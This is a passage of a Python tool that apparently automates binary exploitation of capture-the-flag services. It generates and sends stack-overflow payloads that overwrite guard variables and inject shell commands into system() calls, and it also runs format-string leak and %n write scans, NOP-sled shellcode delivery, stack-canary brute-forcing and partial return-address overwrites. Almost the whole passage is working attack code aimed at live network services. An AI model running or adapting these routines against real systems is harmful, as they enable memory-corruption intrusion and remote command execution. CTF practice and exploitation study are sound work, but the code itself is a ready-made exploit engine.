
    Entering win() there leaves the stack 8 bytes different from a normal call - which is
    exactly the correction a 64-bit callee needs after a `ret` into it. It does the job of
    the realigning `ret` gadget WITHOUT making the payload 8 bytes longer, so it still
    works when the read stops right after the return address."""
    try:
        txt = subprocess.run(["objdump", "-d", "-M", "intel", "--no-show-raw-insn",
                              f"--start-address={addr}", f"--stop-address={addr + 16}", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    rows = re.findall(r"^\s*([0-9a-f]+):\s+(.+?)\s*$", txt, re.M)
    for i, (a, ins) in enumerate(rows[:3]):
        if re.match(r"push\s+rbp", ins) and i + 1 < len(rows):
            return int(rows[i + 1][0], 16)
    return None


def frame_guard_plans(binary, filler=b"A", bad=b"", shell_cmd=None):
    """Ready-to-send overflow payloads from frame_guards(): [(label, payload)].

    One payload sets EVERY guard field above the buffer at once (a two-field guard needs
    both in the same input). For each buffer there are two variants: fields EQUAL to the
    compared constants, then fields DIFFERENT from them - `if (i != '1')` is satisfied by
    the second, and telling the two apart statically means following the jump sense,
    which costs more than one extra connection does."""
    plans = []
    dynamic = frame_guard_plans.dynamic = []      # (label, offset, size): value from the banner
    skipped = frame_guard_plans.skipped = []
    cmd = (shell_cmd or SHELL_CMD).encode() + b";sh"
    lits = None
    for fr in frame_guards(binary):
        for y in fr["bufs"]:
            # Only what is checked AFTER this buffer is filled is a guard. `if (!f)` on a
            # FILE* before the read is not, and neither is a loop bound tested on the way in.
            t_read = fr["read_at"].get(y, -1)
            fs = sorted((y - x, size, val) for x, size, val, i in fr["fields"]
                        if 0 < y - x <= 4096 and i > t_read)
            if not fs:
                continue
            # An ADJACENT buffer compared with strcmp/strncmp/memcmp: fill up to it, then
            # write the literal. One plan per candidate literal from .rodata.
            for o, _sz, val in fs:
                if val != "str" or (y - o) in fr["bufs"]:
                    continue                        # a buffer the program READS is a login field
                if lits is None:
                    try:
                        # Word-like literals first: a compared role/password has no spaces,
                        # a prompt or a file path does.
                        lits = [l for l in strcmp_literals(binary) if 0 < len(l) <= 64]
                        lits = sorted(lits, key=lambda l: (" " in l or "/" in l or ":" in l
                                                           or "%" in l, len(l)))[:6]
                    except Exception:               # noqa: BLE001
                        lits = []
                for lit in lits:
                    payload = (filler * o)[:o] + lit.encode("latin-1", "replace")
                    if not any(b in bad for b in payload):
                        plans.append((f"{fr['func']} buffer at -{hex(y)}: +{o}: neighbouring "
                                      f"buffer compared as a string <- {lit!r}", payload))
            for o, sz, val in fs:
                if val == "dyn" and (o, sz) not in [(d[1], d[2]) for d in dynamic]:
                    dynamic.append((f"{fr['func']} buffer at -{hex(y)}: +{o}: {sz}-byte field "
                                    f"compared with a run-time value", o, sz))
            fs = [f for f in fs if f[2] not in ("str", "dyn")]
            if not fs:
                continue
            for variant in ("eq", "ne"):
                if variant == "ne" and not any(isinstance(v, int) for _o, _s, v in fs):
                    continue
                end = max(o + max(sz, 1) for o, sz, _v in fs)
                buf = bytearray((filler * (end // len(filler) + 1))[:end])
                desc, tail = [], b""
                for o, sz, val in fs:
                    if val == "cmd":
                        # A command string must end where the input ends, so it goes last
                        # and the input's own terminator closes it.
                        if o == fs[-1][0]:
                            del buf[o:]
                            tail = cmd
                            desc.append(f"+{o}: command for system()")
                        continue
                    v = 1 if val is None else val
                    if variant == "ne":
                        v = 0 if val is None else val ^ 1
                    buf[o:o + sz] = (v & ((1 << (8 * sz)) - 1)).to_bytes(sz, "little")
                    desc.append(f"+{o}: {sz}-byte {'!=' if variant == 'ne' else '='} "
                                f"{hex(val) if val is not None else '0 (flag set)' if variant == 'eq' else 'nonzero'}")
                payload = bytes(buf) + tail
                # A sink that stops on NUL (strcpy) cannot deliver `01 00 00 00`, but it
                # does not need to: it writes one terminator itself, and the bytes after
                # that are still the zeros the variable started with. So drop trailing
                # zeros rather than skip the plan - `level == 1` becomes filler + 0x01.
                if 0 in bad:
                    payload = payload.rstrip(b"\x00")
                hit = sorted({b for b in payload if b in bad})
                if hit:
                    skipped.append((f"{fr['func']} +{fs[0][0]}", hit))
                    continue
                if desc and payload not in [p for _l, p in plans]:
                    plans.append((f"{fr['func']} buffer at -{hex(y)}: " + ", ".join(desc), payload))
    return plans


_CBASE = (r"(?:(?:unsigned|signed|const|volatile|static|register)\s+)*"
          r"(?:long\s+long|char|short|int|long|float|double|size_t|ssize_t|bool|_Bool|"
          r"u?int(?:8|16|32|64)_t|unsigned|signed)(?:\s+int)?")


def _c_size(ctype, ptr, bits):
    if ptr:
        return bits // 8
    t = ctype
    if re.search(r"long\s+long|64_t|double", t):
        return 8
    if re.search(r"\bchar\b|bool|_Bool|int8_t", t):
        return 1
    if re.search(r"short|16_t", t):
        return 2
    if re.search(r"\blong\b|size_t", t):
        return bits // 8
    return 4


def _c_decls(body, bits):
    """`type name[N], *p;` declarations in a block -> [(name, elem_size, count, is_ptr)]."""
    out = []
    # Lookbehind, not a consumed delimiter: `char buf[32]; int level;` on ONE line shares
    # the `;` between two declarations, and consuming it hid every second member.
    for m in re.finditer(r"(?:(?<=[;{}\n])|^)\s*(" + _CBASE + r")\s+([^;{}()=]+?)\s*(?:=[^;]*)?;", body):
        ctype = m.group(1)
        for part in m.group(2).split(","):
            d = re.match(r"\s*(\**)\s*(\w+)\s*(?:\[\s*(\w*)\s*\])?\s*$", part)
            if not d:
                continue
            cnt = d.group(3)
            try:
                count = int(cnt, 0) if cnt else 1
            except ValueError:
                count = 1
            ptr = bool(d.group(1))
            out.append((d.group(2), _c_size(ctype, ptr, bits), count, ptr))
    return out


def _c_layout(members, bits):
    """Struct member offsets under the usual ABI: each member aligned to its own size,
    capped at the word size (4 on i386 even for an 8-byte member)."""
    off, lay = 0, {}
    for name, size, count, ptr in members:
        al = min(size, 4 if bits == 32 else 8)
        off = (off + al - 1) // al * al
        lay[name] = (off, size, count, ptr)
        off += size * count
    return lay


def source_guard_plans(path, bits=32, filler=b"A", bad=b"", shell_cmd=None):
    """The same question frame_guard_plans() answers from a binary, answered from C SOURCE
    - for the challenge that ships only `chall.c` (live 5001 did).

    A struct's layout is fixed by the language, so `struct { char name[32]; unsigned
    code; }` puts `code` exactly 32 bytes in: those plans are exact. Separate locals are
    placed by the compiler, so for them the value is SPRAYED across the words after the
    buffer; the guard is checked before the function returns, so it does not matter that
    the spray also runs over the saved return address."""
    try:
        with open(path, "r", errors="replace") as fh:
            txt = fh.read()
    except OSError:
        return []
    txt = re.sub(r"/\*.*?\*/", " ", txt, flags=re.S)
    txt = re.sub(r"//[^\n]*", " ", txt)
    word = bits // 8
    cmd = (shell_cmd or SHELL_CMD).encode() + b";sh"

    layouts = {}                     # variable name -> {member: (off, size, count, ptr)}
    tags = {}
    for m in re.finditer(r"struct\s*(\w*)\s*\{([^{}]*)\}\s*([\w\s,*]*);", txt):
        lay = _c_layout(_c_decls(";" + m.group(2), bits), bits)
        if m.group(1):
            tags[m.group(1)] = lay
        for v in re.findall(r"\w+", m.group(3)):
            layouts[v] = lay
    for m in re.finditer(r"struct\s+(\w+)\s+\*?\s*(\w+)\s*(?:=|;|,|\))", txt):
        if m.group(1) in tags:
            layouts.setdefault(m.group(2), tags[m.group(1)])
    no_structs = re.sub(r"struct\s*\w*\s*\{[^{}]*\}", " ", txt)
    local = {n: (sz, cnt, ptr) for n, sz, cnt, ptr in _c_decls(no_structs, bits)}

    def split(expr):
        expr = expr.strip().lstrip("&*(").rstrip(")")
        p = re.split(r"\.|->", expr)
        return (p[0], p[1]) if len(p) == 2 else (p[0], None) if len(p) == 1 else (None, None)

    ex = r"([A-Za-z_]\w*(?:(?:\.|->)\w+)?)"
    sinks = []
    for pat in (r"\bgets\s*\(\s*" + ex, r"\bfgets\s*\(\s*" + ex, r"\bread\s*\([^,]+,\s*" + ex,
                r"\bscanf\s*\(\s*\"[^\"]*\"\s*,\s*&?" + ex, r"\bstrcpy\s*\(\s*" + ex,
                r"\brecv\s*\([^,]+,\s*" + ex):
        for m in re.finditer(pat, txt):
            if m.group(1) not in sinks:
                sinks.append(m.group(1))

    def cval(tok):
        tok = tok.strip()
        if tok.startswith("'"):
            body = tok[1:-1]
            esc = {"\\n": 10, "\\0": 0, "\\t": 9, "\\r": 13, "\\\\": 92, "\\'": 39}
            return esc.get(body, ord(body[-1]) if body else 0)
        return int(tok, 0)

    conds = []                       # (expr, kind, value)
    num = r"(0[xX][0-9a-fA-F]+|-?\d+|'(?:\\.|[^'\\])')"
    for m in re.finditer(ex + r"\s*[!=]=\s*\(?\s*" + num, txt):
        try:
            conds.append((m.group(1), "num", cval(m.group(2))))
        except ValueError:
            pass
    for m in re.finditer(r"(?:\bif\s*\(|&&|\|\|)\s*!?\s*" + ex + r"\s*(?=\)|&&|\|\|)", txt):
        conds.append((m.group(1), "num", None))
    for m in re.finditer(r"\b(?:strn?cmp|memcmp|strn?casecmp)\s*\(\s*" + ex + r"\s*,\s*\"((?:[^\"\\]|\\.)*)\"", txt):
        conds.append((m.group(1), "str", m.group(2)))
    for m in re.finditer(r"\b(?:strn?cmp|memcmp|strn?casecmp)\s*\(\s*\"((?:[^\"\\]|\\.)*)\"\s*,\s*" + ex, txt):
        conds.append((m.group(2), "str", m.group(1)))
    for m in re.finditer(r"\b(?:system|popen)\s*\(\s*" + ex + r"\s*[,)]", txt):
        conds.append((m.group(1), "cmd", None))

    plans = []
    dynamic = source_guard_plans.dynamic = []

    def emit(label, payload):
        if 0 in bad:
            payload = payload.rstrip(b"\x00")
        if payload and not any(b in bad for b in payload) and payload not in [p for _l, p in plans]:
            plans.append((label, payload))

    for sink in sinks:
        bvar, bmem = split(sink)
        # ---- both in one struct: exact offsets
        if bmem and bvar in layouts and bmem in layouts[bvar]:
            lay = layouts[bvar]
            boff = lay[bmem][0]
            fields = []
            for expr, kind, val in conds:
                v, mname = split(expr)
                if v != bvar or mname not in lay or mname == bmem:
                    continue
                off, size, count, ptr = lay[mname]
                if off <= boff or ptr and kind == "num" and val is not None:
                    continue
                if not any(f[0] == off - boff for f in fields):
                    fields.append((off - boff, size, kind, val, mname))
            for m in re.finditer(ex + r"\s*[!=]=\s*([A-Za-z_]\w*)\b(?!\s*[(.\[-])", txt):
                v, mname = split(m.group(1))
                if v == bvar and mname in lay and mname != bmem and lay[mname][0] > boff \
                        and not re.fullmatch(r"NULL|EOF|true|false", m.group(2)):
                    d = (f"source struct {bvar}: {mname} at +{lay[mname][0] - boff} compared with "
                         f"`{m.group(2)}` (a run-time value)", lay[mname][0] - boff, lay[mname][1])
                    if d not in dynamic:
                        dynamic.append(d)
            fields.sort()
            nums = [f for f in fields if f[2] == "num"]
            for variant in ("eq", "ne"):
                if not nums or (variant == "ne" and not any(f[3] is not None for f in nums)):
                    continue
                end = max(o + sz for o, sz, _k, _v, _n in nums)
                buf = bytearray((filler * (end // len(filler) + 1))[:end])
                desc = []
                for o, sz, _k, val, mname in nums:
                    v = (1 if val is None else val) if variant == "eq" else (0 if val is None else val ^ 1)
                    buf[o:o + sz] = (v & ((1 << (8 * sz)) - 1)).to_bytes(sz, "little")
                    desc.append(f"{mname} at +{o} ({sz} byte) {'=' if variant == 'eq' else '!='} "
                                f"{hex(val) if val is not None else 'nonzero'}")
                emit(f"source struct {bvar}: " + ", ".join(desc), bytes(buf))
            for o, _sz, kind, val, mname in fields:
                if kind == "str":
                    lit = val.encode("latin-1", "replace").decode("unicode_escape").encode("latin-1", "replace")
                    emit(f"source struct {bvar}: {mname} at +{o} compared as a string <- {val!r}",
                         (filler * o)[:o] + lit)
                elif kind == "cmd":
                    emit(f"source struct {bvar}: {mname} at +{o} is run by system()", (filler * o)[:o] + cmd)
            continue
        # ---- separate locals: the compiler chose the gap, so spray
        if bmem is None and bvar in local:
            n = local[bvar][0] * local[bvar][1]
            for expr, kind, val in conds:
                v, mname = split(expr)
                if mname is not None or v == bvar or v not in local:
                    continue
                size, count, ptr = local[v]
                if ptr:
                    continue                      # `if (!f)` on a FILE* is not a guard
                if kind == "num":
                    wants = [((1 if val is None else val), "=")]
                    if val is not None:
                        wants.append((val ^ 1, "!="))
                    for want, tag in wants:
                        unit = (want & ((1 << (8 * size)) - 1)).to_bytes(size, "little")
                        for shift in sorted({0, (-n) % max(size, 1)}):
                            emit(f"source local {v} ({size} byte) {tag} {hex(val) if val is not None else 'nonzero'}: "
                                 f"sprayed after {bvar}[{n}]",
                                 (filler * (n + shift))[:n + shift] + unit * max(1, 48 // size))
                elif kind == "str":
                    lit = val.encode("latin-1", "replace").decode("unicode_escape").encode("latin-1", "replace")
                    for gap in (0, 4, 8, 12, 16, 24, 32):
                        emit(f"source local {v} compared as a string <- {val!r}: {bvar}[{n}] + {gap}",
                             (filler * (n + gap))[:n + gap] + lit)
                elif kind == "cmd":
                    # leading spaces are ignored by sh, so the gap does not need to be known
                    emit(f"source local {v} is run by system(): spaces then a command after {bvar}[{n}]",
                         (filler * n)[:n] + b" " * 40 + cmd)
    return plans[:16]


def extract_magic_source(path):
    """Guard constants compared with == or != in C source, e.g. `access_code == 0x1337c0de`.

    analyze.py only ever looked for the literal string 'deadbeef', so every other guard
    was invisible and --goal var silently wrote 0 (live 5001: 'Access denied. Code:
    0x0000000a'). This makes source-only var challenges work with no --value."""
    try:
        with open(path, "r", errors="replace") as fh:
            txt = fh.read()
    except OSError:
        return []
    out = []
    for m in re.finditer(r"[!=]=\s*\(?\s*(0[xX][0-9a-fA-F]+|\d{3,})", txt):
        try:
            v = int(m.group(1), 0)
        except ValueError:
            continue
        if 0x100 <= v <= 0xFFFFFFFF and v not in out:
            out.append(v)
    return out


def run_var(args, report):
    bits, endian = detect_arch(args, report)
    offsets, off_src = choose_offsets(args, report)
    # First: guards read straight off the stack frame - offset, width and value known
    # together, so each plan is ONE connection instead of an offsets x values sweep.
    plans = []
    if args.binary and not args.value:
        try:
            bad, why = auto_badchars(args.binary)
            if getattr(args, "badchars", None):
                bad += esc_bytes(args.badchars)
            plans = frame_guard_plans(args.binary, bad=bad,
                                      shell_cmd=getattr(args, "shell_cmd", None))
            for where, hit in getattr(frame_guard_plans, "skipped", []):
                print(f"[!] frame guard at {where} needs byte(s) "
                      f"{' '.join(f'{b:#04x}' for b in hit)}, which the input function "
                      f"({why}) stops on - that value cannot be delivered this way")
        except Exception as exc:                      # noqa: BLE001
            print(f"[!] BUG while reading frame guards: {type(exc).__name__}: {exc}")
    if getattr(args, "source", None) and not args.value:
        # Source only (or as well): the layout the C says. Both word sizes when nothing
        # says which it is - a struct of chars and ints is the same either way.
        try:
            for b in ([bits] if (args.binary or args.arch != "auto") else [bits, 96 - bits]):
                for lp in source_guard_plans(args.source, b,
                                             shell_cmd=getattr(args, "shell_cmd", None)):
                    if lp[1] not in [p for _l, p in plans]:
                        plans.append(lp)
        except Exception as exc:                      # noqa: BLE001
            print(f"[!] BUG while reading guards from the source: {type(exc).__name__}: {exc}")
    for label, payload in plans:
        print(f"[*] frame guard: {label}")
        if args.dry_run:
            print(f"[dry] payload={payload!r}")
            continue
        try:
            out = send_attempt(args, payload, followup=True)
        except OSError:
            continue
        if report_flag(args, payload, out, f"var (frame) {label}"):
            return 0
    # Guards compared with a value only the live service knows: read it from the banner of
    # the SAME connection the payload goes down.
    dyn = list(getattr(frame_guard_plans, "dynamic", [])) if args.binary and not args.value else []
    dyn += [d for d in getattr(source_guard_plans, "dynamic", []) if d not in dyn] \
        if getattr(args, "source", None) and not args.value else []
    for label, off, size in dyn:
        print(f"[*] frame guard: {label} - taking the value from the banner")
        for k in range(6):
            cell = {}

            def maker(banner, _k=k, _o=off, _s=size, _c=cell):
                nums = banner_numbers(banner, args.binary)
                if _k >= len(nums):
                    _c["none"] = True
                    return None
                _c["v"] = nums[_k]
                _c["p"] = b"A" * _o + (nums[_k] & ((1 << (8 * _s)) - 1)).to_bytes(_s, "little")
                return _c["p"]
            if args.dry_run:
                print(f"[dry] off={off} size={size} value=<number {k + 1} in the banner>")
                continue
            out = b""
            for _again in range(4):
                # The value is random, so now and then it contains a newline and gets()
                # cuts the payload there. It is re-rolled on every connect: just reconnect.
                cell.clear()
                try:
                    out = send_attempt(args, b"A" * off, make=maker, followup=True)
                except OSError:
                    continue
                if b"\n" not in cell.get("p", b""):
                    break
            if cell.get("none"):
                break
            if report_flag(args, cell.get("p", b""), out,
                           f"var (frame) {label} = {hex(cell['v'])} read from the banner"):
                return 0
    # NO FILES AT ALL (live 5002 shipped none): the offset is unknown, but it does not
    # have to be known. Fill the whole input with the value repeated - whichever word the
    # guard is, it now holds it. The spray runs over the saved return address too, which
    # is harmless: the guard is tested before the function returns.
    # Values worth spraying: every number this connection's banner announces, every
    # number the refusal mentions ("level=0, need 1"), and 1 for `if (authenticated)`.
    # A guard compared with a value drawn at RUN TIME and never printed looks unsolvable -
    # unless the overflow reaches BOTH sides. One byte repeated makes them equal whatever
    # they were. Two connections; it used to be found only by accident, a minute in, under
    # the strcmp label.
    if not args.dry_run:
        for length in (64, 256):
            flood = b"B" * length
            try:
                out = send_attempt(args, flood, followup=True)
            except OSError:
                continue
            if report_flag(args, flood, out, f"var (flood) one byte x{length}: both sides of a "
                                              f"run-time comparison overwritten with the same value"):
                return 0
        if getattr(args, "flood_only", False):
            print("[!] flood: no flag (the comparison is not between two overflowable values)")
            return 1
    if not args.binary and not getattr(args, "source", None) and not args.dry_run:
        try:
            base = send_attempt(args, b"A" * 4)
        except OSError:
            base = b""
        extra = [v for v in banner_numbers(base) if v] + [1]
        if args.value:
            extra = [int(args.value, 0)]         # you know the value; still no offset needed
        print(f"[*] no binary and no source: spraying announced values over the whole input "
              f"(no offset needed); numbers seen so far: {[hex(v) for v in extra[:6]]}")
        tried = []
        for k in range(8):
            cell = {}

            def maker(banner, _k=k, _c=cell):
                live = [] if args.value else banner_numbers(banner)
                cands = live + [v for v in extra if v not in live]
                if _k >= len(cands):
                    _c["none"] = True
                    return None
                _c["v"] = cands[_k]
                _c["p"] = pack_value(cands[_k] & 0xFFFFFFFF, 32, endian) * 64
                return _c["p"]
            out = b""
            for _again in range(4):
                cell.clear()
                try:
                    out = send_attempt(args, b"A" * 4, make=maker, followup=True)
                except OSError:
                    continue
                if b"\n" not in cell.get("p", b""):
                    break
            if cell.get("none"):
                break
            tried.append(cell.get("v"))
            if report_flag(args, cell.get("p", b""), out,
                           f"var (blind spray) value {hex(cell['v'])} repeated over the input"):
                return 0
        print(f"[!] blind spray: {len(tried)} value(s) tried, no flag")
        # What does that failure MEAN? Spray a value nobody would print by chance and see
        # whether the service says it back. If it does, the overflow reaches the guard and
        # exactly one thing is missing: the value it is compared with.
        if not args.value:
            probe = 0x5A595857
            try:
                echo = send_attempt(args, pack_value(probe, 32, endian) * 64)
            except OSError:
                echo = b""
            if re.search(rb"5a595857|1515804759", echo, re.I) and not re.search(rb"5a595857|1515804759", base, re.I):
                line = next((l.strip() for l in echo.decode("latin-1", "replace").splitlines()
                             if re.search(r"5a595857|1515804759", l, re.I)), "")
                print("[!] DIAGNOSIS: the overflow REACHES a variable - the service printed back "
                      "the value just sent:")
                print(f"[!]     {line[:120]}")
                print("[!] So this IS a variable overwrite and the only thing missing is the value "
                      "it must equal, which the service never announces.")
                print("[!] Get it from the source (`if (x == 0x....)`) or the binary, then:")
                print(f"[!]     python3 {os.path.abspath(__file__)} --host {args.host} --port {args.port} "
                      f"--goal var --value 0xVALUE")
    if getattr(args, "frame_only", False):
        print(f"[!] {len(plans) + len(dyn)} frame-guard plan(s) sent, no flag")
        return 1
    if args.value:
        values, val_src = [int(args.value, 0)], "cli"
    else:
        values, val_src = [], []
        if args.binary:
            got = extract_magic(args.binary)
            if got:
                values += got; val_src.append("binary cmp-imm")
        if args.source:
            got = [v for v in extract_magic_source(args.source) if v not in values]
            if got:
                values += got; val_src.append("source ==/!= literal")
        val_src = " + ".join(val_src) or "none found"
        if not values:
            print("[!] no guard constant found in the binary or source.")
            print("[!] --goal var would just write 0 and never match. Pass --value 0xMAGIC")
            print("[!] (read it off the source: the value in `if (field == 0x....)`).")
            return 1
    print(f"[*] mode=bof goal=var values={[hex(v) for v in values]} ({val_src}) "
          f"offsets={offsets[:12]} ({off_src})")
    if args.dry_run:
        for off in offsets:
            for value in values:
                payload = b"A" * off + pack_value(value, bits, endian)
                print(f"[dry] off={off} value={hex(value)} payload={payload!r}")
        return 0
    attempts = 0
    for off in offsets:
        for value in values:
            if attempts >= args.max_attempts:
                print(f"[!] max attempts ({args.max_attempts}) reached")
                return 1
            attempts += 1
            payload = b"A" * off + pack_value(value, bits, endian)
            try:
                out = send_attempt(args, payload, followup=True)
            except OSError:
                continue
            if report_flag(args, payload, out, f"var off={off} value={hex(value)}"):
                return 0
    print(f"[!] no flag after {attempts} attempts")
    return 1


def strcmp_literals(binary, limit=12):
    """Candidate strcmp targets pulled from the binary's own strings.

    analyze.py only finds the literal in SOURCE. With a binary alone the shape was
    unreachable, even though the string it wants is sitting in .rodata."""
    # Words from the PAPER first: a password read from a file at run time is in no section
    # of the binary, and "the password is ..." on the question sheet is the only source.
    told = [t for t in paper("text") if isinstance(t, str)]
    if not binary:
        return told[:limit]
    # Read .rodata specifically. Plain `strings` on the whole file returns .dynstr first,
    # which is symbol names (fgets, puts, ...) - never what a strcmp compares against.
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        elf = ELF(binary)
        blob = b""
        for sec in elf.sections:
            if sec["name"] in (".rodata", ".data"):
                blob += elf.data[sec["offset"]:sec["offset"] + sec["size"]]
    except Exception:
        return []
    out_list = list(told)
    for m in re.finditer(rb"[\x20-\x7e]{4,32}", blob):
        t = m.group(0).decode("latin-1")
        if "%" in t or t.startswith("/") or t in out_list:
            continue
        out_list.append(t)
    return out_list[:limit]


def run_strcmp(args, report):
    literals = [args.expect] if args.expect else []
    if not literals and report:
        for item in report.get("goals", {}).get("strcmp", []):
            if item.get("literal"):
                literals.append(item["literal"])
    if not literals and args.binary:
        literals = strcmp_literals(args.binary)
        if literals:
            print(f"[*] strcmp candidates from the binary: {literals[:6]}")
    if not literals:
        print("[!] strcmp goal needs --expect, or a source/binary with the literal")
        return 1
    literal = literals[0]
    offsets, off_src = choose_offsets(args, report)
    print(f"[*] mode=bof goal=strcmp candidates={len(literals)} offsets={offsets[:12]} ({off_src})")
    if args.dry_run:
        for off in offsets[:4]:
            print(f"[dry] off={off} payload={b'A' * off + literals[0].encode() + bytes(1)!r}")
        return 0
    attempts = 0
    # offsets outer, literals inner: the right offset is usually early, and this way
    # every candidate string is tried there before moving on. The other order burns the
    # whole attempt budget on the first (usually wrong) literal.
    for off in offsets:
        for lit_s in literals:
            lit = lit_s.encode() + b"\x00"
            if attempts >= args.max_attempts:
                break
            attempts += 1
            payload = b"A" * off + lit
            try:
                out = send_attempt(args, payload)
            except OSError:
                continue
            if report_flag(args, payload, out, f"strcmp off={off} lit={lit_s!r}"):
                return 0
    print(f"[!] no flag after {attempts} attempts")
    return 1


def run_fmt(args, report):
    positions = list(range(1, args.max_attempts + 1))
    print(f"[*] mode=fmt goal={args.goal} positions=1..{args.max_attempts}")

    # One connection decides whether the 120-position scan below is worth starting. It
    # used to run to its cap on every target - 20 to 30 s, twice (leak, then write), on
    # services that had already shown the answer:
    #   * `%p` comes back LITERALLY -> the input is printed with a constant format; it is
    #     not a format string, and no position will ever change that.
    #   * nothing comes back at all -> a LEAK has nothing to read. (A blind %n write can
    #     still change a guard, so the write scan is left alone.)
    if not args.dry_run and not args.talk:
        marker = b"QZ<%p.%p.%p>ZQ"
        try:
            probe = send_attempt(args, marker)
        except OSError:
            probe = b""
        i = probe.find(b"QZ<")
        j = probe.find(b">ZQ", i + 3) if i >= 0 else -1
        if i >= 0 and j > i and b"%p" in probe[i:j]:
            print("[!] the service prints %p back literally: this input is not used as a "
                  "format string. Not scanning.")
            return 1
        if i < 0 and args.goal == "fmt-leak" and not re.search(rb"0x[0-9a-fA-F]{4,}|\(nil\)", probe):
            print("[!] nothing sent comes back in the reply, so there is no output for a "
                  "format-string LEAK to read. Not scanning.")
            return 1

    # First, the "Echo Chamber" combined leak: read many consecutive slots in ONE
    # payload with the slot-sized specifier, then decode little-endian and look for a
    # flag. Covers flags split across several stack words (SIT{...} or any format).
    if args.goal in ("fmt-leak", "auto") and not args.dry_run:
        for spec in ("%lx", "%p", "%x"):          # 64-bit slot, pointer, then 32-bit
            lo = max(1, args.fmt_start)
            payload = ".".join(f"%{i}${spec[1:]}" for i in range(lo, lo + args.fmt_count))
            try:
                out = send_attempt(args, payload.encode())
            except OSError:
                continue
            if report_flag(args, payload.encode(), out, f"fmt-leak combined {spec}", strong_only=True):
                return 0
            if args.verbose:
                print(f"[*] {spec} leak -> {printable(out.decode('latin-1','replace')).strip()[:200]}")

    if args.dry_run:
        for i in positions[:40]:
            if args.goal in ("fmt-leak", "auto"):
                for p in (f"%{i}$s", f"%x%x%x%x%x%x-%s"):
                    print(f"[dry] pos={i} payload={p!r}")
            if args.goal in ("fmt-write", "auto"):
                for p in (f"%{i}$n", f"%x%x%n"):
                    print(f"[dry] pos={i} payload={p!r}")
        return 0

    # Quick first pass for a pure write: one "A%N$n" per slot. The pointer to the guarded
    # variable is often a function argument ABOVE a 64-byte buffer (slot 24 on the genie),
    # and three payloads per slot did not get that far inside the stage's time cap.
    FAST_N = 48
    if args.goal == "fmt-write":
        for i in positions[:FAST_N]:
            p = f"A%{i}$n"
            try:
                out = send_attempt(args, p.encode())
            except OSError:
                continue
            if report_flag(args, p.encode(), out, f"fmt-write pos={i}"):
                return 0

    for i in positions:
        if args.goal in ("fmt-leak", "auto"):
            for p in (f"%{i}$s", f"%{i}$p", f"%x%x%x%x%x%x-%s", f"%x%x%x%x-%s"):
                if i > 1 and p.startswith("%x"):
                    break
                try:
                    out = send_attempt(args, p.encode())
                except OSError:
                    continue
                if report_flag(args, p.encode(), out, f"fmt-leak pos={i}", strong_only=True):
                    return 0
        if args.goal in ("fmt-write", "auto"):
            # "A" first: a bare %N$n writes the count printed so far, which is 0, so a guard
            # that must become NON-zero (genie: if (wishes != 0)) is never satisfied by it.
            for p in (f"A%{i}$n", f"%{i}$n", f"%{i}$hn", f"%x-%n", f"%x%x%n", f"%x%x%x%n", f"%x%x%x%x%n"):
                if i > 1 and p.startswith("%x") and "$" not in p:
                    break
                if p.startswith("A") and args.goal == "fmt-write" and i <= FAST_N:
                    continue                    # already sent in the quick pass
                try:
                    out = send_attempt(args, p.encode())
                except OSError:
                    continue
                if report_flag(args, p.encode(), out, f"fmt-write pos={i}"):
                    return 0
        if i % 10 == 0:
            log(args, f"checked {i} format positions")
    print(f"[!] no flag after format-string scan ({args.max_attempts} positions)")
    print("[!] next: --recon, check exact prompt, try %x-%s / %x-%n manually")
    return 1


def run_shellcode(args, report):
    if not args.shellcode_file or not args.buf_addr or args.offset is None:
        print("[!] shellcode mode needs --shellcode-file, --buf-addr, --offset")
        return 1
    bits, endian = detect_arch(args, report)
    with open(args.shellcode_file, "rb") as fh:
        sc = fh.read()
    nop = b"\x90" * max(0, args.offset - len(sc))
    payload = nop + sc + pack_value(int(args.buf_addr, 0), bits, endian)
    print(f"[*] mode=bof goal=shellcode len={len(payload)}")
    if args.dry_run:
        print(f"[dry] payload={payload!r}")
        return 0
    try:
        out = send_attempt(args, payload)
    except OSError as exc:
        print(f"[!] connection error: {exc}")
        return 1
    if report_flag(args, payload, out, "shellcode"):
        return 0
    print("[!] no flag; shellcode output may be a shell. Use --verbose and inspect output.")
    return 1


def main():
    ap = argparse.ArgumentParser(description="Authorised BOF/format-string assistant (stdlib only)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--mode", choices=["auto", "bof", "fmt"], default="auto",
                    help="auto picks from the binary/banner; force it only to narrow a hunt")
    ap.add_argument("--goal", choices=["auto", "ret2win", "var", "strcmp", "fmt-leak", "fmt-write", "shellcode"],
                    default="auto")
    ap.add_argument("--source", help="local .c source (triage)")
    ap.add_argument("--binary", help="local ELF binary (symbols/checksec)")
    ap.add_argument("--offset", type=int, help="known offset")
    ap.add_argument("--flood-only", action="store_true",
                    help="--goal var: only the one-byte flood (equalises both sides of a run-time compare)")
    ap.add_argument("--addr", help="target address, e.g. 0x080491d6")
    ap.add_argument("--arch", choices=["i386", "amd64", "auto"], default="auto",
                    help="auto reads it from the ELF, or from a >32-bit leaked pointer")
    ap.add_argument("--endian", choices=["little", "big", "auto"], default="auto")
    ap.add_argument("--prefix", default="")
    ap.add_argument("--suffix", default="")
    ap.add_argument("--newline", dest="newline", action="store_true", default=True)
    ap.add_argument("--no-newline", dest="newline", action="store_false")
    ap.add_argument("--send-mode", choices=["line", "raw"], default="line",
                    help="line appends a newline (needed by gets/fgets/scanf); raw sends "
                         "the exact bytes (needed when a 0x0a would truncate the payload)")
    ap.add_argument("--noreceive", action="store_true", help="service sends no banner")
    ap.add_argument("--partial-tries", type=int, default=128,
                    help="attempts for --partial (ASLR re-rolls per connection; default 128)")
    ap.add_argument("--partial", action="store_true",
                    help="PIE with no leak: overwrite only the low 2 bytes of the saved "
                         "return address and brute-force the one unknown nibble (16 tries)")
    ap.add_argument("--crash-oracle", action="store_true",
                    help="find the offset with no leak at all: binary-search the smallest "
                         "input that stops the process finishing cleanly (~9 connections)")
    ap.add_argument("--brute-canary", action="store_true",
                    help="recover the canary byte by byte with no leak; only works when "
                         "the service forks per connection (child inherits the canary)")
    ap.add_argument("--canary-regex", help="regex capturing the leaked stack canary "
                                           "(default: looks for 'canary ... 0x...')")
    ap.add_argument("--no-canary", action="store_true", help="never try canary handling")
    ap.add_argument("--cyclic", action="store_true",
                    help="find the offset in ONE connection with a cyclic pattern "
                         "(needs the service to print the saved return address). "
